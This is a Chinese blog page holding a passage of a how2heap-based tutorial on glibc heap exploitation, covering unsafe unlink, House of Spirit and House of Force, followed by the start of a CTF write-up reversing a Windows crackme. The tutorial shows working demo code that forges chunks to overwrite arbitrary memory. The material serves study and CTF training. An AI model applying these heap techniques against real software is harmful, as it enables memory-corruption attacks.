<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---------------------malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">-------------user data,size == malloc size --------------   &lt;--malloc return address</span><br></pre></td></tr></table></figure>
</li>
<li><p>当我们的chunk free后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------free malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">---------Forward pointer to next chunk in list ----------</span><br><span class="line">---------Back pointer to previous chunk in list ---------</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>第二个问题就是什么是unlink，unlink指的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。比如说图中三个chunk，我们现在要拿走p</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9wejz57pj30e70bbmyp.jpg" alt="2"></p>
<p>这时就有unlink操作了，其操作就是数据结构中学习的链表元素的删除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br></pre></td></tr></table></figure>
<p>当然我们可以看看unlink的代码，它并不是这么无脑的就进行了，它还会进行检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</span><br></pre></td></tr></table></figure>
<p>当然这个检查我们非常容易绕过，我们的fd和bk都可以是非法的，只要fd-&gt;bk和bk-&gt;fd又指回了p就可以了</p>
<p>了解了这些后我们就开始看代码了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序首先malloc了chunk0和chunk1，接下来对chunk0的offset2、3处做了赋值操作，根据上面的chunk结构我们很明显可以看出这是在user data里面选择了一片空间进行操作，它特意隔开了两个size，这两个size也就是一个正常的chunk所需的header部分，也就是说我们在伪造一个chunk（这个程序留出来的两个size真正的用处是实现该处地址的读写）。</p>
<p>接下来程序修改了chunk1的内容，首先通过chunk1_ptr - header_size的方式找到了chunk1_header地址（这里的2实际上是2*sizeof(ptr)），接下来的任务就简单了，将prev_size改为我们malloc的size，而将chunk_size的后三位flag进行修改，将上一个chunk视为free可合并状态。</p>
<p>如此，在free chunk1时，我们伪造的chunk0由于同样是free状态，就会发生合并，而合并的过程如下（以下的chunk0指我们伪造的chunk0，true_chunk是我们真的chunk0）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD == chunk0-&gt;fd == true_chunk - 3*size</span><br><span class="line">FD-&gt;bk == true_chunk </span><br><span class="line">true_chunk --&gt; chunk0</span><br></pre></td></tr></table></figure>
<p>那也就是说，我们将chunk0设置为目的地址，也就是true_chunk[3]，就可以通过true_chunk[0]来修改里面的内容了，这也就是为什么最后程序成功修改了victim_string的原因。</p>
<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>house_of_Spirit技术大概上讲的是将已经存在的指针指向我们伪造的chunk（可以位于堆栈、BSS段等等），之后欺骗glibc的相关检查，free进入bin</p>
<p>由于how2heap上的代码有点太多了，所以这里我们用一个简单的demo先来学习一下，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> pre_size;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> <span class="title">fake_chunks</span>[2];</span></span><br><span class="line"><span class="keyword">void</span> *ptr,*victim;</span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">fake_chunks[<span class="number">0</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">fake_chunks[<span class="number">1</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">ptr=(<span class="keyword">void</span> *)&amp;fake_chunks[<span class="number">0</span>].fd;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">victim=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到首先我们在栈上分配了两个我们自己定义的chunk，接着malloc了真的，之后设置了自定义chunk的size的值，free了我们自定义的chunk，再次malloc时，我们会发现victim就是我们伪造的chunk了。</p>
<p>那么问题来了，为什么我们在伪造chunk的时候只是设置了size部分呢？这就要读一下free相关的源码了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_fRE</span><span class="params">(Void_t* mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);    <span class="comment">//找到了mem的chunk地址</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))   <span class="comment">//检查chunk的mmp位</span></span><br><span class="line">    &#123;</span><br><span class="line">        munmap_chunk(p);       <span class="comment">//用unmmap的方式取消映射</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ar_ptr = arena_for_chunk(p);  <span class="comment">//找到chunk对应的area</span></span><br><span class="line">    ...</span><br><span class="line">    _int_free(ar_ptr, mem);       <span class="comment">//调用init_free（）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _int_free(mstate av, Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p;</span><br><span class="line">    INTERNAL_SIZE_T size; </span><br><span class="line">    mfastbinptr* fb; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);   <span class="comment">//找到了mem的chunk</span></span><br><span class="line">    size = chunksize(p);   <span class="comment">//获得chunk的size</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast))    <span class="comment">//当前chunk的size字段的比较，不能超过fastbin的最大值</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                                            &gt;= av-&gt;system_mem, <span class="number">0</span>))            <span class="comment">//比较下一个chunk的size字段，2*SIZE_ZE&lt;chunksize&lt;av-&gt;system_mem</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">        ...</span><br><span class="line">        p-&gt;fd = *fb;</span><br><span class="line">        *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>试了一下这个简单的demo之后再去看how2heap上的代码就很简单了，同样是伪造chunk，不过就是伪造chunk的手段不一样（how2heap中运用了一个较大的数组人工划分了两个chunk）。</p>
<p>还有一点就是两个例子中的size都不大，这是为了free后进入的是fastbin，前面free的源码中也表明了，如果你的size不够fastbin要求的话是根本没法触发之后的操作的。</p>
<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>主要是针对top chunk，通过修改top chunk来malloc任意地址</p>
<p>还是先看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">	*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line">	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子的目的就是改写我们一开始的变量bss_var的值，首先我们malloc了p1，然后通过了计算得到了top的地址。这怎么算出来的呢？我们都知道malloc返回的地址并不是真正的chunk起始地址，而是chunk除去了chunk header的部分，所以我们先先去2*size得到chunk的真正地址，接着再算一下chunk的real size（也就是chunk实际用的大小加上chunk header的大小），二者相加就得到了top的地址。当然实际上算的时候没这么麻烦。。。那我们就可以构想一下了，假如我现在想要malloc返回任意的地址，以上述代码中的bss_var为例，那我的目标就是应该malloc时，top_chunk恰好等于我的地址，所以我们首先需要一个构造一个evil_size使得malloc(evil_Size)后我们的top chunk恰好到了我们想让它到的地方，而这个</p>
<p>。。。。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/windows礼包/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/25/windows礼包/" itemprop="url">windows礼包</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-25T09:36:00+08:00">
                2018-12-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/逆向/" itemprop="url" rel="index">
                    <span itemprop="name">逆向</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>在翻hctf的大佬以前的博客时看见了几道不错的Windows逆向题目，正好到了带新生的时候，详细写写wp也算是带新生入门吧</strong></p>
<p>网盘链接：链接:<a href="https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg" target="_blank" rel="noopener">https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg</a>  密码:nhru</p>
<h1 id="Broken-Windows"><a href="#Broken-Windows" class="headerlink" title="Broken Windows"></a>Broken Windows</h1><p>拿peid查一下壳，这里就不再放截图（懒的打开虚拟机了。。。）了，发现有upx壳，可以手脱也可以工具直接脱，也不再演示了</p>
<p>ida载入发现停在了WinMain这个地方。可能大家对这个函数还不是很熟悉，简单提及一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="keyword">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DialogBoxParamA(hInstance, <span class="number">0x65</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>WinMain是一个函数，该函数的功能是被<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/861110" target="_blank" rel="noopener">系统调用</a>，作为一个32位应用程序的<a href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9/10933004" target="_blank" rel="noopener">入口点</a>。WinMain函数应初始化应用程序，显示主窗口，进入一个消息接收一发送循环，这个循环是应用程序执行的其余部分的顶级控制结构。</p>
</blockquote>
<p>可以看到这个函数有两个关键的词了，第一个就是入口点，你可以简单的理解为windows窗口中的main函数（没学过c语言的新生就当是程序从此处开始执行代码吧），接着再来看函数的内容。可以看到WinMain又去调用DialogBoxParam函数，然后就return了，似乎什么也没有干…吗？这其实就是第二个关键词了，循环，可以想象一下我们常用的windows应用窗口界面（比如你打个游戏什么的），他们可不会说是执行完你的操作就跟完事了，他们依然在循环等待着你的操作。</p>
<p>对这个结构有了一些了解之后我们接着看DialogBoxParam这个函数，简单说就是创建一个对话框，然后用你的第四个参数（也就是某个函数）去处理这个对话框的具体过程，所以我们下一步的分析重点就应该是它，接下来我们就点进去看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HWND v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x111</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">274</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">61536</span> )</span><br><span class="line">        EndDialog(hWnd, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = GetDlgItem(hWnd, <span class="number">1001</span>);</span><br><span class="line">          SendMessageA(v5, <span class="number">0xD</span>u, <span class="number">0x21</span>u, dword_403428);</span><br><span class="line">          qmemcpy(Caption, dword_403428, <span class="number">0x23</span>u);</span><br><span class="line">          CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401020, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        hdc = BeginPaint(hWnd, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(hWnd, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:</span><br><span class="line">        hDlg = hWnd;</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401160, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        dword_40339C = GetWindowLongA(hWnd, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA(dword_40339C, <span class="number">0x66</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403410);</span><br><span class="line">        SetWindowPos(hWnd, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到有大量的函数调用，而且全部都是系统API，如果是比赛场上第一次做这种题，一个一个去学习函数似乎难度系数就有点大了，那我们该怎么去找关键函数呢？这里有三种办法，一是我们从ida给我们的Function窗口中去人工找key function，因为这道题目函数不是很多所以很容易定位到关键的加密函数，之后我们在函数名处按x键就可以找到该函数在哪些地方被调用过，跟过去就可以大体了解到DialogFunc的逻辑了；第二种方法就是去找CreateThread一类的函数，这是windows编程中常用的一种操作，这类函数有什么作用呢？其实他会创建一个线程（可以想象成一个子程序），然后根据你传入的第四个参数（也是个函数）来执行；第三就是提前了解一下这些的作用喽，其实他们都对应的不同的消息响应，在下边一个题目中会具体提到。</p>
<p>通过这几种方法我们找到了这两个关键的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401160</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_401080(byte_403018);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
